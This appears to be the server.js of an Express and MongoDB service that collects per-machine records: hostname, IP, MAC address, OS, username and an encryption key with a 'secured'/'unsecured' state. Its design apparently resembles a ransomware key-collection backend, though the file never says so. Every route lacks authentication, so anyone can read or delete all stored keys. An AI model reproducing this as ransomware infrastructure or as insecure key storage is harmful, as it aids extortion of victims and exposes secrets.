// server.js

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Environment variables
const PORT = process.env.PORT || 5000;
const HOST_IP = process.env.HOST_IP || 'localhost';
const MONGODB_URI = process.env.MONGODB_URI;

// Middleware
app.use(cors()); // Allow all origins for local development
app.use(express.json());

// MongoDB Connection
mongoose.connect(MONGODB_URI)
  .then(() => console.log('MongoDB Connected'))
  .catch(err => console.error('MongoDB Connection Error:', err));

// Define Schema
const encryptionKeySchema = new mongoose.Schema({
  hostname: String,
  ip_address: String,
  mac_address: String,
  os_info: String,
  username: String,
  encryption_key: String,
  state: {
    type: String,
    enum: ['secured', 'unsecured'],
    default: 'secured'
  },
  sent_at: String
});

// Create Model
const EncryptionKey = mongoose.model('EncryptionKey', encryptionKeySchema);

// Routes

// Get all keys
app.get('/api/keys', async (req, res) => {
  try {
    const keys = await EncryptionKey.find().sort({ sent_at: -1 });
    res.json(keys);
  } catch (err) {
    console.error('Error fetching keys:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get keys by username
app.get('/api/keys/:userId', async (req, res) => {
  try {
    const keys = await EncryptionKey.find({ username: req.params.userId }).sort({ sent_at: -1 });
    res.json(keys);
  } catch (err) {
    console.error('Error fetching keys for user:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Update key state
app.patch('/api/keys/:keyId/state', async (req, res) => {
  try {
    const { state } = req.body;
    if (!['secured', 'unsecured'].includes(state)) {
      return res.status(400).json({ error: 'Invalid state value' });
    }
    const updatedKey = await EncryptionKey.findByIdAndUpdate(
      req.params.keyId,
      { state },
      { new: true }
    );
    if (!updatedKey) {
      return res.status(404).json({ error: 'Key not found' });
    }
    res.json(updatedKey);
  } catch (err) {
    console.error('Error updating key state:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Create new key
app.post('/api/keys', async (req, res) => {
  try {
    const {
      hostname,
      ip_address,
      mac_address,
      os_info,
      username,
      encryption_key,
      state
    } = req.body;

    const newKey = new EncryptionKey({
      hostname,
      ip_address,
      mac_address,
      os_info,
      username,
      encryption_key,
      state: state || 'secured',
      sent_at: new Date().toISOString()
    });

    const savedKey = await newKey.save();
    res.status(201).json(savedKey);
  } catch (err) {
    console.error('Error creating key:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Delete key
app.delete('/api/keys/:keyId', async (req, res) => {
  try {
    const deletedKey = await EncryptionKey.findByIdAndDelete(req.params.keyId);
    if (!deletedKey) {
      return res.status(404).json({ error: 'Key not found' });
    }
    res.json({ message: 'Key deleted successfully' });
  } catch (err) {
    console.error('Error deleting key:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Start Server
app.listen(PORT, HOST_IP, () => 
  console.log(`Server running at http://${HOST_IP}:${PORT}`)
);
